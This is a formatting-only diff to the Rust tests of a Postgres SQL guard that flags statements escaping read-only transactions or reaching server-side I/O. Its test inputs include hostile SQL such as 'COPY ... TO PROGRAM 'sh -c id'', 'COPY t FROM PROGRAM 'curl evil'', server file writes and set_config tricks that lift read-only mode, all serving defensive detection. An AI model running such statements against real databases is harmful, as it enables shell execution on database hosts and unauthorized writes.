@@ -543,7 +543,10 @@ fn calls_set_config(stmt: &str) -> bool {
 pub fn reaches_server_side_io(sql: &str) -> bool {
     split_statements(sql).iter().any(|stmt| {
         // Large objects export straight to a server path, under any head keyword.
-        if words_of(stmt).iter().any(|w| w == "LO_EXPORT" || w == "LO_IMPORT") {
+        if words_of(stmt)
+            .iter()
+            .any(|w| w == "LO_EXPORT" || w == "LO_IMPORT")
+        {
             return true;
         }
         if head_keywords(stmt).0 != "COPY" {
@@ -602,10 +605,16 @@ mod tests {
         assert!(escapes_read_only_tx("DISCARD ALL"));
         assert!(escapes_read_only_tx("-- sneaky\nCOMMIT"));
         // lifting the block's access mode — every spelling
-        assert!(escapes_read_only_tx("SET TRANSACTION READ WRITE; INSERT INTO t VALUES (1)"));
+        assert!(escapes_read_only_tx(
+            "SET TRANSACTION READ WRITE; INSERT INTO t VALUES (1)"
+        ));
         assert!(escapes_read_only_tx("SET transaction_read_only = off"));
-        assert!(escapes_read_only_tx("SET LOCAL transaction_read_only TO false"));
-        assert!(escapes_read_only_tx("SET default_transaction_read_only = off"));
+        assert!(escapes_read_only_tx(
+            "SET LOCAL transaction_read_only TO false"
+        ));
+        assert!(escapes_read_only_tx(
+            "SET default_transaction_read_only = off"
+        ));
         assert!(escapes_read_only_tx(
             "SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE"
         ));
@@ -616,7 +625,9 @@ mod tests {
         assert!(!escapes_read_only_tx("SET search_path = app; SELECT 1"));
         assert!(!escapes_read_only_tx("SET statement_timeout = '5s'"));
         assert!(!escapes_read_only_tx("RESET search_path"));
-        assert!(!escapes_read_only_tx("SAVEPOINT sp; ROLLBACK TO SAVEPOINT sp"));
+        assert!(!escapes_read_only_tx(
+            "SAVEPOINT sp; ROLLBACK TO SAVEPOINT sp"
+        ));
         // a nested BEGIN is a warning-only no-op, the block still holds
         assert!(!escapes_read_only_tx("BEGIN; SELECT 1"));
         // AND CHAIN reopens with the same (read-only) characteristics
@@ -643,7 +654,9 @@ mod tests {
         // Block comments nest in Postgres: the statement below is one comment
         // followed by COMMIT, not `x */ COMMIT`.
         assert!(escapes_read_only_tx("/* a /* b */ x */ COMMIT"));
-        assert!(escapes_read_only_tx("/* /* */ */ SET TRANSACTION READ WRITE"));
+        assert!(escapes_read_only_tx(
+            "/* /* */ */ SET TRANSACTION READ WRITE"
+        ));
         assert!(!escapes_read_only_tx("/* a /* COMMIT */ b */ SELECT 1"));
     }
 
@@ -692,8 +705,12 @@ mod tests {
             "DO $$ BEGIN PERFORM set_config('transaction_read_only','off',false); END $$"
         ));
         // reading the knob is harmless and must keep working
-        assert!(!escapes_read_only_tx("SELECT current_setting('transaction_read_only')"));
-        assert!(!escapes_read_only_tx("SELECT set_config('search_path', 'app', false)"));
+        assert!(!escapes_read_only_tx(
+            "SELECT current_setting('transaction_read_only')"
+        ));
+        assert!(!escapes_read_only_tx(
+            "SELECT set_config('search_path', 'app', false)"
+        ));
     }
 
     #[test]
@@ -701,7 +718,10 @@ mod tests {
         use super::bind_parameters;
         let sql = "SELECT * FROM t WHERE name = $1 AND age > $2";
         let out = bind_parameters(sql, &["O'Brien".into(), "18".into()]).unwrap();
-        assert_eq!(out, "SELECT * FROM t WHERE name = 'O''Brien' AND age > '18'");
+        assert_eq!(
+            out,
+            "SELECT * FROM t WHERE name = 'O''Brien' AND age > '18'"
+        );
         // Значение с обратным слэшем уходит в E'…': при
         // standard_conforming_strings = off обычный литерал прочитал бы `\` как
         // escape, и значение поехало бы (а `'…\'` — сломало бы запрос).
@@ -741,7 +761,9 @@ mod tests {
     fn server_side_io_gate() {
         use super::reaches_server_side_io;
         // a shell on the database host — read-only transactions do not stop it
-        assert!(reaches_server_side_io("COPY (SELECT 1) TO PROGRAM 'sh -c id'"));
+        assert!(reaches_server_side_io(
+            "COPY (SELECT 1) TO PROGRAM 'sh -c id'"
+        ));
         assert!(reaches_server_side_io("COPY t FROM PROGRAM 'curl evil'"));
         // writing a file on the server
         assert!(reaches_server_side_io("COPY t TO '/tmp/dump.csv'"));
@@ -845,7 +867,10 @@ mod tests {
             vec!["/* a; /* nested; */ b; */ SELECT 1"]
         );
         // comment-only / whitespace-only chunks yield no statement
-        assert_eq!(split_statements("-- only a comment\n; ;"), Vec::<String>::new());
+        assert_eq!(
+            split_statements("-- only a comment\n; ;"),
+            Vec::<String>::new()
+        );
         assert_eq!(split_statements(";;  ;"), Vec::<String>::new());
     }
 
@@ -866,7 +891,10 @@ mod tests {
         assert_eq!(advance_tx(Active, "COMMIT", true), Idle);
         assert_eq!(advance_tx(Active, "ROLLBACK", true), Idle);
         // a whole cycle in one batch nets out to idle
-        assert_eq!(advance_tx(Idle, "BEGIN; UPDATE t SET x=1; COMMIT", true), Idle);
+        assert_eq!(
+            advance_tx(Idle, "BEGIN; UPDATE t SET x=1; COMMIT", true),
+            Idle
+        );
         // BEGIN left open across runs stays active
         assert_eq!(advance_tx(Idle, "BEGIN; SELECT 1", true), Active);
         // an error inside an open tx aborts it; in autocommit it stays idle
@@ -893,6 +921,9 @@ mod tests {
         assert_eq!(advance_tx(Active, "ABORT", true), Idle);
         assert_eq!(advance_tx(Idle, "-- go\nBEGIN", true), Active);
         // a DO block's inner BEGIN/END is dollar-quoted, not a transaction verb
-        assert_eq!(advance_tx(Idle, "DO $$ BEGIN PERFORM 1; END $$", true), Idle);
+        assert_eq!(
+            advance_tx(Idle, "DO $$ BEGIN PERFORM 1; END $$", true),
+            Idle
+        );
     }
 }
